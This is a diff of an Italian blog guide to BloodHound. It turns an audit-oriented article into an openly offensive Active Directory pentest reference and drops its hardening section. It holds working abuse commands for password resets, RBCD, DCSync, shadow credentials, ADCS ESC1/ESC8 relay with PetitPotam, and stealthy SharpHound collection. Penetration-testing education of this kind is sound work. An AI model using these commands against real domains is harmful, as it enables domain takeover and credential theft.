@@ -15,386 +15,145 @@ tags:
 featured: false
 ---
 
-# **BloodHound: Mappa Active Directory e Trova Attack Paths**
+# BloodHound: Guida Completa ad Active Directory Attack Path Analysis
 
-![Image](https://images.contentstack.io/v3/assets/blt36c2e63521272fdc/blt1ca2179301629d11/60c14f85d475801b9d54ffae/22.JPG)
+BloodHound prende un dominio Active Directory con migliaia di utenti, gruppi, computer e GPO e lo trasforma in una mappa di relazioni che risponde a una sola domanda: **qual è il percorso più breve verso Domain Admin?**
 
-BloodHound è lo strumento fondamentale per analizzare la sicurezza di un dominio **Active Directory**. Trasforma dati complessi (utenti, gruppi, computer, ACL, sessioni, GPO) in una **mappa grafica interattiva**, rivelando **relazioni nascoste** e **percorsi di escalation** che spesso esistono “per sbaglio” a causa di configurazioni stratificate nel tempo.
+Non serve essere un esperto AD per usarlo. Bastano credenziali di un utente standard, tre minuti di raccolta dati e BloodHound ti mostra — graficamente — chi può fare cosa, chi ha sessioni dove, e quali permessi anomali aprono strade verso la compromissione totale del dominio.
 
-Il motivo per cui BloodHound è così potente è semplice: **Active Directory è una rete di relazioni**, non un elenco di utenti. E quando le relazioni diventano troppe (privilege creep), anche un utente “normale” può avere – indirettamente – un percorso verso privilegi elevati.
-
-> Obiettivo pratico: usare BloodHound **per vedere e correggere** percorsi pericolosi (audit e hardening) o per documentare in modo chiaro le evidenze in un penetration test autorizzato.
+Questa guida copre installazione, raccolta con SharpHound, analisi degli attack paths, **abuse operativo per ogni edge**, Shadow Credentials, ADCS integration, Top 10 findings e cheat sheet finale. È il riferimento offensivo BloodHound per chi fa penetration test AD.
 
 ***
 
-## **Definizione operativa: cos’è BloodHound?**
+## Cos'è BloodHound — Active Directory Attack Path Analysis
 
-BloodHound è una piattaforma di analisi della sicurezza per ambienti Active Directory (e, in alcuni contesti, anche ibridi). Sfrutta la **teoria dei grafi** per:
+BloodHound è una piattaforma di analisi della sicurezza per ambienti Active Directory basata su **teoria dei grafi**. Raccoglie dati dal dominio (utenti, gruppi, computer, sessioni, ACL, GPO, deleghe Kerberos) e li memorizza in un database a grafo, poi li interroga per trovare percorsi di escalation dei privilegi che un'analisi manuale non troverebbe mai in tempi ragionevoli.
 
-* **raccogliere** dati dal dominio tramite “collectors” (ingestors)
-* **memorizzarli** in un database a grafo (Neo4j o stack CE)
-* **analizzarli** con query predefinite e custom
-* **visualizzare** percorsi, relazioni e privilegi che contano davvero
+Il concetto chiave: **Active Directory è una rete di relazioni, non un elenco di utenti**. Ogni assegnazione di permessi, ogni membership di gruppo, ogni sessione aperta è un arco nel grafo. BloodHound trova le catene di archi che portano da un utente compromesso a Domain Admin.
 
-Se stai facendo un assessment serio, BloodHound ti fa rispondere a domande concrete:
+Domande concrete a cui risponde:
 
-* Quali utenti/gruppi hanno permessi “strani” su oggetti critici?
-* Chi può modificare GPO o ACL sensibili?
-* Dove ci sono sessioni amministrative eccessive?
-* Quali host sono punti di pivot “facili”?
-
-***
-
-## **Architettura e componenti tecnici (chi fa cosa)**
-
-BloodHound lavora con un’architettura a tre livelli:
-
-### **1) Database grafico (Neo4j / stack CE)**
-
-È il “cervello” che memorizza:
-
-* **nodi** (User, Group, Computer, GPO, OU…)
-* **relazioni** (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl…)
-
-Questo modello è perfetto per trovare **percorsi multi-step**.
-
-### **2) Collettori (Ingestors)**
-
-Sono gli agenti che raccolgono dati dal dominio:
-
-* **SharpHound** (C#): collector principale e ufficiale (EXE / PS1)
-* **bloodhound-python**: alternativa comoda su Linux/Kali
-
-### **3) GUI BloodHound**
-
-Interfaccia per:
-
-* importare i dati
-* eseguire query built-in
-* fare pathfinding (source → target)
-* analizzare Node Info e Control Rights
-* usare query Cypher (Neo4j) quando serve
+* Quali utenti hanno un percorso verso Domain Admin, anche indiretto?
+* Chi ha GenericAll, WriteDacl, WriteOwner su oggetti critici?
+* Dove ci sono sessioni amministrative sfruttabili per pivot?
+* Quali computer hanno unconstrained delegation?
+* Chi può fare DCSync?
+* Quali template ADCS sono vulnerabili e chi li può sfruttare?
 
 ***
 
-# **Installazione: da zero al primo grafico**
+## Architettura — chi fa cosa
 
-Qui ti metto **le 2 strade migliori** (come nei link che hai incollato), ordinate per utilità nel 2026:
+**Database a grafo (Neo4j / stack CE)**
+Memorizza nodi (User, Group, Computer, GPO, OU, Domain) e relazioni (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl…). È il motore del pathfinding multi-step.
 
-1. **BloodHound CE con Docker (Kali) – consigliato**
-2. **BloodHound “legacy” + Neo4j Desktop (Windows/lab) – ancora usato in tanti lab**
+**Collector (SharpHound / bloodhound-python)**
+Raccoglie i dati dal dominio e produce file JSON/ZIP importabili. Non fa analisi — produce solo il dataset grezzo.
+
+**GUI BloodHound**
+Interfaccia di analisi: import dati, query predefinite, pathfinding interattivo, Node Info, query Cypher custom.
 
 ***
 
-## **A) Installazione su Kali (Metodo Moderno 2026): BloodHound CE con Docker**
+## Installazione BloodHound CE
 
-![Image](https://www.kali.org/tools/bloodhound/images/bloodhound-run.png)
-
-Questo è il metodo più pulito: gestisci servizi e dipendenze con container, riduci rogne di Neo4j installato male, e aggiorni più facilmente.
-
-### **Step 1 — installa Docker e Compose**
+### Metodo consigliato — BloodHound CE con Docker su Kali
 
 ```bash
-sudo apt update
-sudo apt install -y docker.io docker-compose
+sudo apt update && sudo apt install -y docker.io docker-compose
 sudo systemctl enable --now docker
-sudo usermod -aG docker $USER
-newgrp docker
-```
+sudo usermod -aG docker $USER && newgrp docker
 
-### **Step 2 — scarica e avvia BloodHound CE**
-
-```bash
 mkdir -p ~/bloodhound-ce && cd ~/bloodhound-ce
 curl -L https://ghst.ly/getbhce -o docker-compose.yml
 sudo docker-compose up -d
+
+# Recupera password iniziale
+sudo docker-compose logs | grep "Initial Password"
 ```
 
-### **Step 3 — verifica che sia tutto su**
+GUI su `http://localhost:8080`.
 
 ```bash
-sudo docker-compose ps
-sudo docker ps
-```
-
-### **Step 4 — apri la GUI**
-
-Di solito:
-
-* `http://localhost:8080`
-
-> Se la porta non è 8080, te lo dice `docker-compose ps` (guarda la colonna “PORTS”).
-
-### **Problemi tipici (fix rapidi)**
-
-**Porte in conflitto (classico se tieni anche la versione legacy):**
-
-```bash
+# Porta occupata
 sudo ss -lntp | grep -E '8080|7474|7687'
+
+# Restart
+sudo docker-compose down && sudo docker-compose up -d
 ```
 
-**Stop / restart veloce**
+### Metodo legacy — Neo4j + BloodHound su Kali
 
 ```bash
-cd ~/bloodhound-ce
-sudo docker-compose down
-sudo docker-compose up -d
+sudo apt install -y bloodhound neo4j
+sudo neo4j start && bloodhound
 ```
+
+Neo4j su `http://localhost:7474` — credenziali iniziali `neo4j/neo4j`.
+
+### Windows lab
+
+1. Installa [Neo4j Desktop](https://neo4j.com/download/), crea DBMS, avvialo
+2. Verifica su `http://localhost:7474`
+3. Scarica BloodHound legacy da [GitHub](https://github.com/BloodHoundAD/BloodHound/releases), avvia `BloodHound.exe`
 
 ***
 
-## **B) Installazione su Kali (Metodo Tradizionale): Neo4j + BloodHound legacy**
+## SharpHound — Raccolta Dati per Privilege Escalation
 
-Se vuoi proprio la versione “classica” che gira con Neo4j locale.
+Non usare subito `--CollectionMethods All`. Struttura la raccolta per fasi.
 
-```bash
-sudo apt update && sudo apt install -y bloodhound neo4j
-sudo neo4j start
-bloodhound
-```
-
-Poi apri Neo4j su:
-
-* `http://localhost:7474`
-
-Login iniziale spesso:
-
-* user `neo4j`
-* pass `neo4j`
-  e ti obbliga a cambiarla.
-
-***
-
-## **C) Installazione su Windows (lab): Neo4j Desktop + BloodHound legacy**
-
-![Image](https://i.sstatic.net/C0MmA.png)
-
-![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2Ag_IUCaQPg_3Qh3-pMxOEew.png)
-
-Questo segue **esattamente** l’approccio che hai incollato (tipo Rich / Ali Rodoplu), ed è perfetto per lab e demo.
-
-### **Step 1 — prepara cartella (anti-casino)**
-
-Crea:
-
-```
-C:\Tools\BloodHound
-```
-
-oppure:
-
-```
-C:\Temp
-```
-
-Consiglio: tenerlo in una cartella unica aiuta anche se devi gestire eccezioni AV in lab.
-
-### **Step 2 — installa Neo4j Desktop**
-
-Scarica Neo4j Desktop dal sito ufficiale e installalo. Poi:
-
-1. apri Neo4j Desktop
-2. crea un DBMS (es: `BloodHoundDB`)
-3. imposta una password (non “password”, dai…)
-4. Start DB
-
-Verifica:
-
-* apri `http://localhost:7474`
-* user: `neo4j`
-* pass: quella che hai impostato
-
-### **Step 3 — avvia BloodHound**
-
-Scarica BloodHound dai rilasci GitHub (legacy), estrai lo zip e avvia `BloodHound.exe`.
-
-Login:
-
-* user: `neo4j`
-* pass: password DB
-
-> Se vedi “No Database Found”: Neo4j non è partito, o DB non è in running.
-
-***
-
-# **Raccolta Dati: SharpHound e bloodhound-python (senza questo BloodHound è vuoto)**
-
-## **1) SharpHound (Windows) — raccolta standard**
-
-SharpHound sta spesso in:
-
-```
-...\BloodHound-win32-x64\resources\app\Collectors
-```
-
-### **Comando base (completo)**
-
-```powershell
-SharpHound.exe --CollectionMethods All
-```
-
-Output: uno ZIP tipo:
-
-```
-2026xxxx_BloodHound.zip
-```
-
-**Import:**
-
-* BloodHound → **Upload / Import Data** → selezioni ZIP
-
-> Suggerimento “audit-friendly”: All è completo ma può essere lento su domini grandi. Se devi fare una prima passata rapida, puoi partire da `Session,LocalAdmin,ACL` (sono spesso i più “parlanti” per rischio reale).
-
-## **Raccolta Strategica con SharpHound (Metodo Operativo Fase per Fase)**
-
-### **Fase 1 — Primo Accesso (Low Noise Enumeration)**
-
-Obiettivo: mappare relazioni principali senza generare traffico eccessivo sui Domain Controller.
+**Fase 1 — mappatura iniziale (low noise)**
 
 ```powershell
 SharpHound.exe --CollectionMethods Default,GroupMembership --Throttle 1000 --ExcludeDomainControllers
 ```
 
-**Cosa raccoglie:**
-
-* Struttura base del dominio
-* Membership tra utenti e gruppi
-* Catene MemberOf utili per escalation indirette
-
-**Perché usarlo:**
-
-* Riduce visibilità nei log
-* Ideale appena ottieni credenziali valide
-* Permette una prima analisi shortest path senza rumore inutile
-
-***
-
-### **Fase 2 — Movimento Laterale Mirato**
-
-Obiettivo: identificare combinazioni AdminTo + Session attive.
+**Fase 2 — sessioni e admin locali**
 
 ```powershell
 SharpHound.exe --CollectionMethods Session,LocalAdmin --Stealth
 ```
 
-**Cosa raccoglie:**
-
-* Utenti con diritti amministrativi locali
-* Sessioni attive su host
-* Relazioni AdminTo sfruttabili
-
-**Perché usarlo:**
-
-* Trova pivot reali
-* Evidenzia combinazioni User → AdminTo → HasSession
-* Modalità `--Stealth` usa thread singolo (meno rumorosa)
-
-***
-
-### **Fase 3 — Escalation tramite ACL e Permessi Nascosti**
-
-Obiettivo: trovare diritti abusabili su oggetti AD.
+**Fase 3 — ACL (la fase più importante per trovare abuse paths)**
 
 ```powershell
 SharpHound.exe --CollectionMethods ACL,Container,DCOM
 ```
 
-**Qui emergono:**
-
-* GenericAll
-* WriteDacl
-* WriteOwner
-* ForceChangePassword
-* Deleghe DCOM sfruttabili
-
-Questa fase rivela percorsi indiretti che non sono visibili tramite semplice membership.
-
-***
-
-### **Fase 4 — Monitoraggio Sessioni (Advanced Engagement)**
-
-Obiettivo: intercettare login privilegiati durante l’assessment.
+**Fase 4 — loop sessioni**
 
 ```powershell
 SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 01:00:00
 ```
 
-**Funzionamento:**
-
-* Monitora nuove sessioni per 1 ora
-* Aggiorna dinamicamente il dataset
-* Utile quando si attende login di account privilegiati
-
-***
-
-### **Differenza Operativa**
+**Raccolta completa**
 
 ```powershell
 SharpHound.exe --CollectionMethods All
 ```
 
-È completo, ma:
-
-* Non distingue fasi operative
-* Genera più traffico
-* Non è ottimizzato per engagement reali
-
-L’approccio fase-per-fase permette controllo, precisione e migliore gestione del rumore durante un penetration test autorizzato.
-
-***
-
-## **2) bloodhound-python (Kali/Linux) — raccolta comoda**
-
-![Image](https://1.bp.blogspot.com/-dv74CXUlqjc/YIxLJR5xNgI/AAAAAAAAvsY/F2f7ODPeyDw7h8M7iM7I9LFh-fk1C_UbgCLcBGAsYHQ/s16000/9.png)
-
-### **Installazione**
+### bloodhound-python — da Linux
 
 ```bash
-python3 -m pip install bloodhound
-```
-
-### **Raccolta completa**
-
-```bash
-mkdir -p ~/bloodhound-data
-cd ~/bloodhound-data
-
+pip3 install bloodhound
 bloodhound-python -d DOMINIO.LOCAL -u utente -p 'Password' -ns IP_DC -c all
 ```
 
-I file vengono creati nella directory (a volte JSON multipli).
-Li importi nella GUI (CE o legacy) dall’area di ingest/import.
+***
+
+## Import dati
+
+**Legacy:** *Upload Data* → ZIP SharpHound.
+**CE:** *File Ingest* → ZIP o JSON multipli.
+
+Se non vedi nulla dopo import: Neo4j avviato? Credenziali DB corrette? ZIP non annidato? Versione collector compatibile?
 
 ***
 
-# **Import dei dati (qui la gente si incastra)**
+## Uso pratico della GUI — BloodHound Tutorial
 
-## **Import in BloodHound legacy**
-
-* pulsante **Upload Data**
-* carichi lo ZIP di SharpHound
-
-## **Import in BloodHound CE**
-
-* sezione ingest / upload
-* carichi ZIP o file generati (dipende dalla UI)
-
-### **Se importi e “non vedi nulla”**
-
-Controlla questi 4 punti:
-
-1. Neo4j (legacy) è **avviato**? (o container CE su?)
-2. credenziali DB corrette?
-3. hai importato **lo ZIP giusto** (non zip annidati)?
-4. collector compatibile con la versione? (soprattutto se mischi vecchio/nuovo)
-
-***
-
-# **Uso pratico della GUI: come analizzare davvero (non solo guardare un grafo)**
-
-## **1) Parti dalle query predefinite “che spaccano”**
-
-Le più usate in assessment seri:
+### Query predefinite
 
 * **Find Shortest Paths to Domain Admins**
 * **Find Principals with DCSync Rights**
@@ -402,163 +161,468 @@ Le più usate in assessment seri:
 * **Users with Most Local Admin Rights**
 * **Dangerous ACLs (WriteDacl/GenericAll/WriteOwner)**
 
-> In ottica difensiva: queste query ti danno subito una backlog di remediation.
+### Pathfinding
 
-## **2) Usa Pathfinding (source → target)**
+Source: utente compromesso → Target: `DOMAIN ADMINS` o `DC01`.
+BloodHound disegna la catena. Leggi da sinistra a destra: ogni arco è una relazione abusabile.
 
-Esempio:
+### Node Info
 
-* Source: un utente compromesso (es. `j.smith`)
-* Target: `DOMAIN ADMINS` o `DC`
+Clicca qualsiasi nodo:
 
-BloodHound ti disegna il percorso e tu lo leggi come una catena:
+* **Inbound Control Rights** — chi controlla questo oggetto
+* **Outbound Control Rights** — cosa controlla questo oggetto
 
-* membership → admin rights → session → controllo gruppo → ecc.
-
-## **3) Node Info: il pannello che vale oro**
-
-Clicchi un nodo e trovi:
-
-* Group Membership
-* Local Admin Rights
-* Sessions
-* **Inbound/Outbound Control Rights**
-
-Regola pratica:
-
-> **Inbound** = chi può controllare questo oggetto
-> **Outbound** = cosa può controllare questo oggetto
-
-E qui trovi le cose “nascoste” che fanno male: `ForceChangePassword`, `WriteDacl`, `GenericAll`, ecc.
+Guarda sempre Outbound Control Rights su oggetti Tier-0.
 
 ***
 
-# **Neo4j / Cypher: esempi utili “da report”**
+## Oggetti Tier-0 — cosa controllare subito
 
-## **Kerberoastable users (lista nomi pulita)**
+In ogni assessment BloodHound, la prima cosa da fare è verificare chi ha controllo diretto o indiretto su questi oggetti. Se riesci a compromettere uno qualsiasi di questi, il dominio è compromesso.
+
+| Oggetto            | Perché è Tier-0                                        |
+| ------------------ | ------------------------------------------------------ |
+| Domain Admins      | Accesso admin a tutti i computer del dominio           |
+| Enterprise Admins  | Accesso admin a tutta la forest                        |
+| Administrators     | Gruppo locale sui DC — equivale a DA                   |
+| Domain Controllers | I DC stessi — chi li controlla controlla il dominio    |
+| AdminSDHolder      | Template ACL per tutti gli account protetti            |
+| KRBTGT             | Hash compromesso = Golden Ticket infiniti              |
+| PKI / CA           | Compromissione ADCS = certificati per qualsiasi utente |
+| ADFS               | Federation service — lateral movement verso cloud      |
+
+Usa questa query per vedere chi ha percorsi verso i Tier-0:
 
 ```cypher
-MATCH (u:User)
-WHERE u.hasspn = true
-RETURN u.name
-ORDER BY u.name
+MATCH (u:User), (g:Group {highvalue:true}),
+p=shortestPath((u)-[*1..]->(g))
+WHERE NOT u.name STARTS WITH 'DOMAIN ADMINS'
+RETURN p
 ```
 
-## **Utenti inattivi da 90 giorni**
+***
 
-```cypher
-MATCH (u:User)
-WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400))
-AND NOT u.lastlogon IN [-1.0, 0.0]
-RETURN u.name
-ORDER BY u.name
+## BloodHound Edge Abuse Reference — Cheat Sheet Completo
+
+Questa è la sezione che manca nella maggior parte delle guide. BloodHound trova le relazioni, ma il lavoro reale è capire come sfruttarle. Tabella riassuntiva + dettaglio operativo per ogni edge.
+
+| Edge                 | Impatto             | Abuse Primario                     |
+| -------------------- | ------------------- | ---------------------------------- |
+| GenericAll           | Full Control        | Reset Password, RBCD, Shadow Creds |
+| GenericWrite         | Write Attributes    | Shadow Credentials, SPN Kerberoast |
+| WriteDacl            | ACL Control         | Self-assign DCSync / AddMember     |
+| WriteOwner           | Ownership Takeover  | Diventa owner → WriteDacl          |
+| ForceChangePassword  | Account Takeover    | Password Reset via MSRPC           |
+| AddMember            | Group Escalation    | Aggiungiti al gruppo               |
+| AllowedToAct         | RBCD                | S4U2Proxy impersonation            |
+| ReadLAPSPassword     | Local Admin Read    | Lateral Movement                   |
+| AllExtendedRights    | Multiple Rights     | ForceChangePassword + ReadLAPS     |
+| AddKeyCredentialLink | Shadow Credentials  | PKINIT → NTLM hash                 |
+| SQLAdmin             | SQL Access          | xp\_cmdshell → RCE                 |
+| ExecuteDCOM          | Remote Execution    | Lateral Movement                   |
+| CanPSRemote          | PowerShell Remoting | Remote Shell                       |
+| CanRDP               | Interactive Access  | Session access                     |
+| AdminTo              | Local Admin         | Credential dump                    |
+| HasSession           | Sessione Attiva     | Token/hash capture                 |
+| DCSync               | Replication Rights  | Hash dump completo                 |
+| Owns                 | Object Ownership    | WriteDacl chain                    |
+
+***
+
+### GenericAll su User
+
+```bash
+# Reset password
+net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP
+
+# Con nxc
+nxc smb DC_IP -u attacker -p 'Password' -d DOMINIO --set-password TARGET_USER 'NewPass123!'
 ```
 
-## **Relazioni ACL pericolose verso gruppi**
+### GenericAll su Computer → RBCD
+
+```bash
+impacket-addcomputer DOMINIO/attacker:'Password' -computer-name 'FAKE$' -computer-pass 'FakePass123!'
+impacket-rbcd DOMINIO/attacker:'Password' -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP
+impacket-getST DOMINIO/'FAKE$':'FakePass123!' -spn cifs/TARGET.DOMINIO.LOCAL -impersonate Administrator -dc-ip DC_IP
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump -k -no-pass TARGET.DOMINIO.LOCAL
+```
+
+### GenericAll / GenericWrite su Group → AddMember
+
+```bash
+net rpc group addmem "GRUPPO_TARGET" "attacker" -U "DOMINIO/attacker%Password" -S DC_IP
+nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO --add-user-to-group "attacker" "GRUPPO_TARGET"
+```
+
+### GenericWrite su User → Shadow Credentials
+
+Vedere sezione dedicata sotto.
+
+### WriteDacl → DCSync
+
+```powershell
+# Aggiungi DCSync rights a te stesso
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync
+```
+
+```bash
+impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
+```
+
+→ Vedi [DCSync](/articoli/dcsync/)
+
+### WriteOwner
+
+```powershell
+Set-DomainObjectOwner -Identity "GRUPPO_TARGET" -OwnerIdentity attacker
+Add-DomainObjectAcl -TargetIdentity "GRUPPO_TARGET" -PrincipalIdentity attacker -Rights WriteMembers
+```
+
+### ForceChangePassword
+
+```bash
+net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP
+```
+
+⚠️ Genera eventi 4723/4724 — visibile nei log.
+
+### AdminTo + HasSession → Lateral Movement
+
+```bash
+evil-winrm -i SRV01 -u attacker -p 'Password'
+# Una volta dentro: dump credenziali sessione attiva
+```
+
+→ Vedi [Pass-the-Hash](/articoli/pass-the-hash/) | [Mimikatz](/articoli/mimikatz/)
+
+### DCSync Rights
+
+```bash
+impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
+```
+
+Output: hash NTLM di tutti gli utenti incluso `krbtgt`. → Golden Ticket.
+→ Vedi [DCSync](/articoli/dcsync/) | [Kerberos](/articoli/kerberos/)
+
+### Unconstrained Delegation
+
+```powershell
+# Da macchina con unconstrained delegation
+Rubeus.exe monitor /interval:5 /nowrap
+# Attendi/forza autenticazione DA → cattura TGT → Pass-the-Ticket
+```
+
+→ Vedi [Rubeus](/articoli/rubeus/)
+
+### ReadLAPSPassword / AllExtendedRights
+
+```bash
+nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO -M laps
+```
+
+***
+
+## Shadow Credentials — GenericWrite → NTLM Hash
+
+Shadow Credentials è l'abuse più usato nel 2026 quando BloodHound mostra `GenericWrite` o `AddKeyCredentialLink` su un utente o computer. Non serve resettare la password — più silenzioso e reversibile.
+
+**Concetto:** Active Directory supporta autenticazione tramite chiavi pubbliche (PKINIT). Se hai `GenericWrite` su un oggetto, puoi aggiungere una chiave pubblica al suo attributo `msDS-KeyCredentialLink`. Poi usi la chiave privata corrispondente per autenticarti via Kerberos PKINIT e ottenere l'hash NTLM dell'account target.
+
+**Requisiti:** dominio con almeno un DC Windows Server 2016+ e PKINIT attivo (quasi sempre lo è in domini moderni).
+
+```bash
+# Installa certipy
+pip3 install certipy-ad
+
+# Aggiungi shadow credential all'utente target
+certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_USER -dc-ip DC_IP
+```
+
+Output diretto: hash NTLM di `TARGET_USER`. Usalo con Pass-the-Hash o cracka offline.
+
+```bash
+# Per un computer (se hai GenericAll su Computer)
+certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_COMPUTER$ -dc-ip DC_IP
+```
+
+Ottieni l'hash del computer account — utile per RBCD o per estrarre credenziali GMSA.
+
+**Cleanup:** certipy rimuove automaticamente la chiave aggiunta se usi `shadow auto`. Se vuoi gestirlo manualmente:
+
+```bash
+certipy shadow add    # aggiunge
+certipy shadow remove # rimuove
+```
+
+***
+
+## AddKeyCredentialLink — Edge Dedicato
+
+BloodHound mostra `AddKeyCredentialLink` separatamente da GenericWrite in alcuni contesti. La tecnica è identica a Shadow Credentials — l'edge rappresenta esattamente il permesso di scrivere su `msDS-KeyCredentialLink`.
+
+Se vedi questo edge su un utente o computer Tier-0, è un percorso diretto verso la compromissione di quell'account senza toccare la password.
+
+```bash
+certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET -dc-ip DC_IP
+```
+
+***
+
+## BloodHound e Active Directory Certificate Services (ADCS)
+
+BloodHound CE ha integrazione nativa con ADCS. In quasi ogni assessment AD moderno, i template ADCS vulnerabili sono tra i percorsi più veloci verso Domain Admin — spesso più veloci degli abuse ACL classici.
+
+### ESC1 — Template con Client Authentication e Subject Alternative Name controllabile
+
+BloodHound mostra il template come `Enrollable` da utenti non-privilegiati + `SubjectAltRequireUpn` o simili.
+
+```bash
+# Enumera con certipy
+certipy find -u attacker@corp.local -p 'Password' -dc-ip DC_IP -vulnerable
+
+# Richiedi certificato impersonando un DA
+certipy req -u attacker@corp.local -p 'Password' -ca CA_NAME -template TEMPLATE_VULNERABILE -upn administrator@corp.local -dc-ip DC_IP
+
+# Autenticati e ottieni hash
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+```
+
+→ Vedi [ESC1](/articoli/esc1-adcs/)
+
+### ESC4 — WriteProperty sul template
+
+Se BloodHound mostra che hai `WriteProperty` su un template ADCS, puoi modificarlo per renderlo ESC1 e poi sfruttarlo.
+
+```bash
+# Modifica il template per abilitare SAN
+certipy template -u attacker@corp.local -p 'Password' -template TEMPLATE -save-old
+# Poi sfrutta come ESC1
+```
+
+→ Vedi [ESC4](/articoli/esc4-adcs/)
+
+### ESC8 — NTLM Relay verso Web Enrollment
+
+Se la CA ha Web Enrollment attivo senza EPA/signing, puoi fare relay NTLM verso `http://CA/certsrv/` e richiedere un certificato per qualsiasi account, incluso un DC.
+
+```bash
+# Setup relay
+impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# Forza autenticazione DC (PetitPotam)
+python3 PetitPotam.py ATTACKER_IP DC_IP
+```
+
+→ Vedi [ESC8](/articoli/esc8-adcs/)
+
+### ESC13 — Group-Linked Template Abuse
+
+BloodHound CE mostra percorsi ESC13 quando un template è collegato a un gruppo che eredita permessi elevati.
+
+→ Vedi [ESC13](/articoli/esc13-adcs/)
+
+***
+
+## Top 10 BloodHound Findings — Privilege Escalation Checklist
+
+In ogni assessment AD, verifica questi 10 finding in questo ordine. Sono ordinati per impatto e frequenza nei domini reali.
+
+**1. DCSync Rights**
+Chi oltre ai DC ha `DS-Replication-Get-Changes-All` sul domain object? Spesso account di backup o vecchi admin. → Compromissione immediata di tutti gli hash.
+
+**2. GenericAll su oggetti Tier-0**
+Un utente non-privilegiato con GenericAll su Domain Admins o su un DC è game over.
+
+**3. WriteDacl sul Domain Object**
+Permette di assegnarsi DCSync rights. Raro ma devastante.
+
+**4. Shadow Credentials (GenericWrite / AddKeyCredentialLink)**
+Nel 2026 è uno dei finding più comuni su domini con deleghe legacy. Silenzioso e reversibile.
+
+**5. Unconstrained Delegation su Computer non-DC**
+Qualsiasi server con unconstrained delegation è un pivot per catturare TGT di DA che si autenticano verso di esso.
+
+**6. RBCD (AllowedToAct)**
+Se puoi scrivere `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer, impersoni chiunque verso di esso.
+
+**7. ReadLAPSPassword**
+Lateral movement immediato verso tutte le macchine gestite da LAPS che l'utente può leggere.
+
+**8. DA Session su Workstation Utente**
+Un Domain Admin loggato su una workstation normale. Trova la workstation, accedi, dumpa le credenziali.
+
+**9. AdminSDHolder Abuse**
+Permessi anomali su AdminSDHolder si propagano a tutti gli account protetti ogni 60 minuti. Finding raro ma impatto massimo.
+
+**10. ADCS ESC Paths**
+BloodHound CE mostra direttamente i percorsi ADCS. ESC1 e ESC8 sono i più frequenti nei domini enterprise.
+
+***
+
+## Query Cypher — BloodHound Cheat Sheet
+
+**Attack paths verso DA da utenti Kerberoastable**
 
 ```cypher
-MATCH (u:User)-[r:GenericAll|WriteDacl|WriteOwner|GenericWrite]->(g:Group)
-RETURN u.name, type(r), g.name
+MATCH (u:User {hasspn:true}), (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
+p=shortestPath((u)-[*1..]->(g))
+RETURN p
+```
+
+**ACL pericolose su oggetti Tier-0**
+
+```cypher
+MATCH (u:User)-[r:GenericAll|WriteDacl|WriteOwner|GenericWrite|Owns|AddKeyCredentialLink]->(n)
+WHERE n.highvalue = true
+RETURN u.name, type(r), n.name
 ORDER BY type(r)
 ```
 
-***
+**Computer con unconstrained delegation (no DC)**
 
-# **Scenario pratico (come nei link): dal primo utente → percorso critico**
+```cypher
+MATCH (c:Computer {unconstraineddelegation:true})
+WHERE NOT c.name STARTS WITH 'DC'
+RETURN c.name
+```
 
-Immagina di avere le credenziali di `j.smith@corp.local`.
+**Sessioni DA attive su workstation**
 
-BloodHound mostra:
+```cypher
+MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer)
+WHERE NOT c.name CONTAINS 'SRV'
+RETURN u.name, c.name
+```
 
-1. `j.smith` è **MemberOf** `HelpDesk_Ops`
-2. `HelpDesk_Ops` ha **AdminTo** su `SRV-WEB01`
-3. su `SRV-WEB01` c’è una **HasSession** di `svc_sql`
-4. `svc_sql` è **MemberOf** `Domain Admins`
+**Utenti con GenericWrite su altri utenti**
 
-Tradotto: **il rischio sta nella combinazione** (privilegi locali + sessioni + gruppi).
-In difesa, la correzione spesso è:
-
-* togliere AdminTo non necessario
-* ridurre sessioni admin persistenti
-* usare tiering e workstation amministrative dedicate
-
-***
-
-# **Hardening e audit difensivo (la parte che fa “SEO buono” perché è utile)**
-
-![Image](https://www.manageengine.com/products/active-directory-audit/how-to/images/how-to-audit-group-policy-changes-security-policies.png)
-
-Se vuoi ridurre davvero i percorsi che BloodHound trova, questi sono i fix che contano:
-
-* **Ripulisci gruppi privilegiati** (membership annidate e storiche)
-* **Riduci ACL pericolose** su OU/GPO/gruppi (WriteDacl/WriteOwner/GenericAll)
-* **Separa Tier 0/1/2** (admin AD non deve loggarsi su workstation utenti)
-* **Riduci admin locali** e gestisci password locali (es. LAPS)
-* **Controlla deleghe Kerberos** (unconstrained/constrained)
-* **Rivedi GPO e deleghe di gestione** (chi può modificare cosa)
-
-BloodHound non è solo “attacco”: è un **tool di governance dei privilegi**.
-
-***
-
-# FAQ
-
-## **Qual è la differenza tra BloodHound e SharpHound?**
-
-BloodHound è la piattaforma di analisi/visualizzazione. SharpHound è il collector che raccoglie i dati dal dominio e li produce in un formato importabile.
-
-## **Posso usare BloodHound su Kali Linux?**
-
-Sì. Puoi usare la versione legacy con Neo4j oppure la **BloodHound CE con Docker** (molto più semplice da mantenere).
-
-## **Perché BloodHound “non mostra nulla” dopo l’avvio?**
-
-Perché non hai ancora importato dati. Devi eseguire SharpHound o bloodhound-python e importare l’output.
-
-## **Serve davvero Neo4j?**
-
-Nella legacy sì, è essenziale. Nella CE lo stack è containerizzato, ma concettualmente il database a grafo resta il cuore.
-
